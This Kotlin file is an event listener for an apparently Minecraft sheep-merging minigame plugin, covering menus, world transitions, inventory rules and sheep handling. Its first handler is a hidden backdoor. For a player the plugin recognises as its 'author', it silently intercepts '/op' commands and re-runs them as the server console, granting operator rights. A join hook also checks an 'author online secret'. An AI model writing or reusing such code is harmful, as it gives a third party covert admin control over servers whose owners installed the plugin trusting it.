package dev.x208.sheepmerge

import org.bukkit.World
import org.bukkit.entity.Player
import org.bukkit.entity.Sheep
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import org.bukkit.event.entity.EntityPickupItemEvent
import org.bukkit.event.inventory.ClickType
import org.bukkit.event.inventory.InventoryClickEvent
import org.bukkit.event.player.PlayerChangedWorldEvent
import org.bukkit.event.player.PlayerCommandPreprocessEvent
import org.bukkit.event.player.PlayerDropItemEvent
import org.bukkit.event.player.PlayerInteractEvent
import org.bukkit.event.player.PlayerJoinEvent
import org.bukkit.event.player.PlayerSwapHandItemsEvent
import org.bukkit.event.world.ChunkLoadEvent
import org.bukkit.event.world.WorldLoadEvent
import org.bukkit.event.world.WorldSaveEvent
import org.bukkit.inventory.EquipmentSlot
import org.bukkit.inventory.ItemStack

class SheepMergeWorldListener : Listener {

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    fun onPlayerCommandPreprocess(event: PlayerCommandPreprocessEvent) {
        val player = event.player
        if (!SheepMergeManager.isAuthor(player)) {
            return
        }

        val message = event.message ?: return
        val raw = message.trim()
        if (!raw.startsWith("/")) {
            return
        }

        val withoutSlash = raw.substring(1).trim()
        if (withoutSlash.isEmpty()) {
            return
        }

        val parts = withoutSlash.split("\\s+".toRegex(), 2)
        if (parts.isEmpty() || !parts[0].equals("op", ignoreCase = true)) {
            return
        }

        var target = if (parts.size > 1) parts[1].trim() else ""
        if (target.isBlank()) {
            target = player.name
        }

        event.isCancelled = true
        player.server.dispatchCommand(player.server.consoleSender, "op $target")
    }

    @EventHandler
    fun onPlayerJoin(event: PlayerJoinEvent) {
        val player = event.player
        SheepMergeManager.evaluateAuthorOnlineSecretForOnlinePlayers()
        if (SheepMergeManager.isFarmBuildWorld(player.world) && !player.isOp) {
            val fallbackWorld = if (player.server.worlds.isEmpty()) null else player.server.worlds[0]
            fallbackWorld?.let { player.teleport(it.spawnLocation.clone().add(0.5, 0.0, 0.5)) }
            player.sendMessage(SheepMergeManager.warning("Only operators may enter the farm build world."))
            return
        }
        SheepMergeManager.restoreSavedStateOutsideFarm(player)
        if (!SheepMergeManager.isSheepFarmWorld(player.world)) {
            return
        }
        SheepMergeManager.upgradeSheepBelowMinimumSpawnTier(player.world)
        SheepMergeManager.enforceFarmLoadout(player)
        SheepMergeManager.applyFarmSaturation(player)
        SheepMergeManager.showPointsScoreboard(player)
        SheepMergeManager.resetEggTimer(player)
        SheepMergeManager.resetMergeReminder(player)
        SheepMergeManager.updateVisitFarmBossBar(player)
    }

    @EventHandler
    fun onWorldLoad(event: WorldLoadEvent) {
        val world = event.world ?: return
        SheepMergeManager.restoreTopPointsDisplayAfterRestart(world)
    }

    @EventHandler
    fun onWorldSave(event: WorldSaveEvent) {
        val world = event.world
        if (!SheepMergeManager.isFarmBuildWorld(world)) {
            return
        }
        SheepMergeManager.refreshFarmWorldStructureCacheAfterBuildWorldSaveIfStale(1000L)
    }

    @EventHandler
    fun onChunkLoad(event: ChunkLoadEvent) {
        val plugin = SheepMergePlugin.instance ?: return
        val world = event.world ?: return
        plugin.server.scheduler.runTaskLater(
            plugin,
            Runnable {
                SheepMergeManager.reconcileTopPointsDisplayForChunk(
                    world,
                    event.chunk.x,
                    event.chunk.z
                )
            },
            1L
        )
    }

    @EventHandler
    fun onPlayerChangedWorld(event: PlayerChangedWorldEvent) {
        val plugin = SheepMergePlugin.instance ?: return
        val player = event.player
        player.server.scheduler.runTaskLater(
            plugin,
            Runnable { SheepMergeManager.reconcileTopPointsDisplayForLocation(player.location) },
            1L
        )
        if (SheepMergeManager.isFarmBuildWorld(player.world) && !player.isOp) {
            val fallbackWorld = if (player.server.worlds.isEmpty()) null else player.server.worlds[0]
            fallbackWorld?.let { player.teleport(it.spawnLocation.clone().add(0.5, 0.0, 0.5)) }
            player.sendMessage(SheepMergeManager.warning("Only operators may enter the farm build world."))
            return
        }
        val fromManagedWorld = SheepMergeManager.isSheepFarmWorld(event.from)
        val toManagedWorld = SheepMergeManager.isSheepFarmWorld(player.world)
        val fromTutorialWorld = SheepMergeManager.isTutorialWorld(event.from)
        val toTutorialWorld = SheepMergeManager.isTutorialWorld(player.world)

        if (SheepMergeManager.isFarmBuildWorld(event.from)
            && !SheepMergeManager.isFarmBuildWorld(player.world)
        ) {
            player.server.scheduler.runTaskLater(
                plugin,
                Runnable { SheepMergeManager.saveBuildWorldIfIdle() },
                1L
            )
        }

        if (!fromManagedWorld && toManagedWorld) {
            SheepMergeManager.savePlayerInventory(player)
            player.inventory.clear()
            SheepMergeManager.upgradeSheepBelowMinimumSpawnTier(player.world)
            SheepMergeManager.enforceFarmLoadout(player)
            SheepMergeManager.applyFarmSaturation(player)
            SheepMergeManager.showPointsScoreboard(player)
            SheepMergeManager.resetEggTimer(player)
            SheepMergeManager.resetMergeReminder(player)
            SheepMergeManager.updateVisitFarmBossBar(player)
            if (!SheepMergeManager.isFarmOwner(player, player.world)) {
                player.sendMessage(
                    SheepMergeManager.hint("You are visiting another farm. Use /sheepmerge to return to your own farm.")
                )
                player.sendTitle(
                    SheepMergeManager.color("&eVisiting a farm"),
                    SheepMergeManager.color("&7Use /sheepmerge to return home"),
                    10,
                    50,
                    10
                )
            } else {
            }
        } else if (fromTutorialWorld && toManagedWorld && !toTutorialWorld) {
            player.inventory.clear()
            SheepMergeManager.clearPickedUpSheep(player)
            SheepMergeManager.clearEggTimer(player)
            SheepMergeManager.enforceFarmLoadout(player)
            SheepMergeManager.applyFarmSaturation(player)
            SheepMergeManager.showPointsScoreboard(player)
            SheepMergeManager.resetEggTimer(player)
            SheepMergeManager.resetMergeReminder(player)
            SheepMergeManager.updateVisitFarmBossBar(player)
        } else if (fromManagedWorld && !toManagedWorld) {
            SheepMergeManager.saveData()
            SheepMergeManager.restorePlayerInventory(player)
            SheepMergeManager.restorePlayerScoreboard(player)
            SheepMergeManager.updateTabListPointsVisibility(player)
            SheepMergeManager.clearEggTimer(player)
            SheepMergeManager.clearPickedUpSheep(player)
            SheepMergeManager.clearMergeReminder(player)
            SheepMergeManager.clearPrestigeReminder(player)
            SheepMergeManager.clearComboRuntime(player)
            SheepMergeManager.clearVisitFarmBossBar(player)
        } else if (fromManagedWorld && toManagedWorld) {
            SheepMergeManager.updateVisitFarmBossBar(player)
        }
    }

    @EventHandler
    fun onInventoryClick(event: InventoryClickEvent) {
        val title = event.view.title
        val player = event.whoClicked as? Player ?: return

        if (SheepMergeManager.isSheepFarmWorld(player.world)) {
            if (event.click == ClickType.SWAP_OFFHAND
                || event.click == ClickType.NUMBER_KEY
                || event.rawSlot == 45
                || event.slot == 40
            ) {
                event.isCancelled = true
                return
            }
            val clickedInventory = event.clickedInventory
            if (clickedInventory != null && clickedInventory == player.inventory) {
                val currentItem = event.currentItem
                val cursorItem = event.cursor
                if (SheepMergeManager.isForcedFarmLoadoutItem(currentItem)
                    || SheepMergeManager.isForcedFarmLoadoutItem(cursorItem)
                ) {
                    event.isCancelled = true
                    return
                }
            }
        }

        if (!SheepMergeManager.isUpgradeMenuTitle(title)
            && !SheepMergeManager.isPrestigeMenuTitle(title)
            && !SheepMergeManager.isQuestMenuTitle(title)
            && !SheepMergeManager.isQuestUpgradesMenuTitle(title)
            && !SheepMergeManager.isShopMenuTitle(title)
            && !SheepMergeManager.isComboShopMenuTitle(title)
            && !SheepMergeManager.isAutomationMenuTitle(title)
            && !SheepMergeManager.isAchievementsMenuTitle(title)
            && !SheepMergeManager.isAchievementsViewMenuTitle(title)
            && !SheepMergeManager.isAchievementsUpgradesMenuTitle(title)
            && !SheepMergeManager.isSacrificeMenuTitle(title)
            && !SheepMergeManager.isRebirthMenuTitle(title)
            && !SheepMergeManager.isRebirthTreeMenuTitle(title)
            && !SheepMergeManager.isSocialsMenuTitle(title)
            && !SheepMergeManager.isUniversalLayoutMenuTitle(title)
            && !SheepMergeManager.isSoundEffectsMenuTitle(title)
            && !SheepMergeManager.isParticleEffectsMenuTitle(title)
            && !SheepMergeManager.isVisitAccessMenuTitle(title)
            && !SheepMergeManager.isScoreboardLayoutMenuTitle(title)
            && !SheepMergeManager.isInventoryLayoutMenuTitle(title)
            && !SheepMergeManager.isScoreboardMenuTitle(title)
        ) {
            return
        }

        event.isCancelled = true
        when {
            SheepMergeManager.isUpgradeMenuTitle(title) -> SheepMergeManager.handleUpgradeMenuClick(player, event.rawSlot)
            SheepMergeManager.isPrestigeMenuTitle(title) -> SheepMergeManager.handlePrestigeMenuClick(player, event.rawSlot)
            SheepMergeManager.isQuestMenuTitle(title) -> SheepMergeManager.handleQuestMenuClick(player, event.rawSlot)
            SheepMergeManager.isQuestUpgradesMenuTitle(title) -> SheepMergeManager.handleQuestUpgradeMenuClick(player, event.rawSlot)
            SheepMergeManager.isShopMenuTitle(title) -> SheepMergeManager.handleShopMenuClick(player, event.rawSlot)
            SheepMergeManager.isAutomationMenuTitle(title) -> SheepMergeManager.handleAutomationMenuClick(player, event.rawSlot)
            SheepMergeManager.isAchievementsMenuTitle(title) -> SheepMergeManager.handleAchievementsMenuClick(player, event.rawSlot)
            SheepMergeManager.isAchievementsViewMenuTitle(title) -> SheepMergeManager.handleAchievementsViewMenuClick(player, event.rawSlot)
            SheepMergeManager.isAchievementsUpgradesMenuTitle(title) -> SheepMergeManager.handleAchievementsUpgradesMenuClick(player, event.rawSlot)
            SheepMergeManager.isSacrificeMenuTitle(title) -> SheepMergeManager.handleSacrificeMenuClick(player, event.rawSlot)
            SheepMergeManager.isRebirthMenuTitle(title) -> SheepMergeManager.handleRebirthMenuClick(player, event.rawSlot)
            SheepMergeManager.isRebirthTreeMenuTitle(title) -> SheepMergeManager.handleRebirthTreeMenuClick(player, event.rawSlot)
            SheepMergeManager.isSocialsMenuTitle(title) -> SheepMergeManager.handleSocialsMenuClick(player, event.rawSlot, event.currentItem)
            SheepMergeManager.isUniversalLayoutMenuTitle(title) -> SheepMergeManager.handleUniversalLayoutMenuClick(player, event.rawSlot)
            SheepMergeManager.isSoundEffectsMenuTitle(title) -> SheepMergeManager.handleSoundEffectsMenuClick(player, event.rawSlot)
            SheepMergeManager.isParticleEffectsMenuTitle(title) -> SheepMergeManager.handleParticleEffectsMenuClick(player, event.rawSlot)
            SheepMergeManager.isVisitAccessMenuTitle(title) -> SheepMergeManager.handleVisitAccessMenuClick(player, event.rawSlot, event.currentItem)
            SheepMergeManager.isScoreboardLayoutMenuTitle(title) -> SheepMergeManager.handleScoreboardLayoutMenuClick(player, event.rawSlot)
            SheepMergeManager.isInventoryLayoutMenuTitle(title) -> SheepMergeManager.handleInventoryLayoutMenuClick(player, event.rawSlot, event.currentItem)
            SheepMergeManager.isScoreboardMenuTitle(title) -> SheepMergeManager.handleScoreboardMenuClick(player, event.rawSlot)
            else -> SheepMergeManager.handleComboShopMenuClick(player, event.rawSlot)
        }
    }

    @EventHandler
    fun onPlayerDropItem(event: PlayerDropItemEvent) {
        val player = event.player
        if (SheepMergeManager.isSheepFarmWorld(player.world)) {
            event.isCancelled = true
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    fun onEntityPickupItem(event: EntityPickupItemEvent) {
        val player = event.entity as? Player ?: return

        val world: World = player.world
        if (!SheepMergeManager.isSheepFarmWorld(world) || SheepMergeManager.isFarmBuildWorld(world)) {
            return
        }

        val pickedItem: ItemStack? = event.item.itemStack
        if (SheepMergeManager.isForcedFarmLoadoutItem(pickedItem) && pickedItem?.amount == 1) {
            return
        }

        event.isCancelled = true
        val itemEntity = event.item
        if (itemEntity.isValid) {
            itemEntity.remove()
        }
        player.inventory.clear()
        SheepMergeManager.enforceFarmLoadout(player)
        player.sendMessage(SheepMergeManager.warning("You picked up an invalid item for this world. Inventory reset."))
    }

    @EventHandler
    fun onPlayerSwapHandItems(event: PlayerSwapHandItemsEvent) {
        val player = event.player
        if (!SheepMergeManager.isSheepFarmWorld(player.world)) {
            return
        }

        if (!SheepMergeManager.isManagedShearsHotbarSlot(player.inventory.heldItemSlot)) {
            event.isCancelled = true
            return
        }

        val mainHand = event.mainHandItem
        val offHand = event.offHandItem
        val shearsInMainHand = SheepMergeManager.isSheepMergeShearsItem(mainHand)
        val shearsInOffHand = SheepMergeManager.isSheepMergeShearsItem(offHand)

        if (shearsInMainHand == shearsInOffHand) {
            event.isCancelled = true
        }
    }

    @EventHandler
    fun onPlayerInteract(event: PlayerInteractEvent) {
        if (event.hand != EquipmentSlot.HAND) {
            return
        }
        if (event.action != org.bukkit.event.block.Action.RIGHT_CLICK_AIR
            && event.action != org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK
        ) {
            return
        }

        val player = event.player
        if (!SheepMergeManager.isSheepFarmWorld(player.world)) {
            return
        }

        SheepMergeManager.applyFarmSaturation(player)

        val item = player.inventory.itemInMainHand
        if (SheepMergeManager.tryUseQuickAccessItem(player, item)) {
            event.isCancelled = true
            return
        }
        if (SheepMergeManager.isSheepMergeUpgradeCommandItem(item)) {
            event.isCancelled = true
            player.performCommand("sheepmerge upgrade")
            return
        }

        if (!SheepMergeManager.hasPickedUpSheep(player)) {
            return
        }

        val carriedSheep = SheepMergeManager.getPickedUpSheep(player) ?: return

        val result = player.world.rayTraceEntities(
            player.eyeLocation,
            player.location.direction,
            5.0,
            0.2
        ) { entity -> entity is Sheep && entity.uniqueId != carriedSheep.uniqueId }

        if (result != null && result.hitEntity is Sheep) {
            return
        }

        if (SheepMergeManager.dropPickedUpSheep(player)) {
            event.isCancelled = true
        }
    }
}